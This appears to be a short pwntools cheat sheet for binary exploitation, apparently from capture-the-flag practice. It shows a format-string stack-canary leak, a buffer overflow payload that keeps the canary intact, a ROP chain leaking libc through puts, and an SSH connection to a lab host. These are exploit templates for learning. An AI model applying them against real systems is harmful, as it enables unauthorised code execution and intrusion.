#Examples

#send one line
io.sendline("")

#rec until 
io.recvuntil("")

#output for debug
info("")

#recv canary
io.recvuntil("string")
io.sendline("%19$p")
canary = io.recvline().strip() 
#print canary for output
info(f"canary = {canary}")
#send canary in payload
io.sendline(("A"*88).encode()+p64(int(canary, base=16)))

#read symbols
elf = ELF('./***')
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
MAIN_FUNC = elf.symbols['main'] 

# Leak libc version: https://libc.blukat.me/
OFFSET = ("A"*136).encode()
payload = OFFSET + POP_RDI + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_FUNC)

#remote with ssh
s = ssh(host='10.10.10.139', user='<USERNAME>', password='<PASSWORD>')
io = s.process('./***')
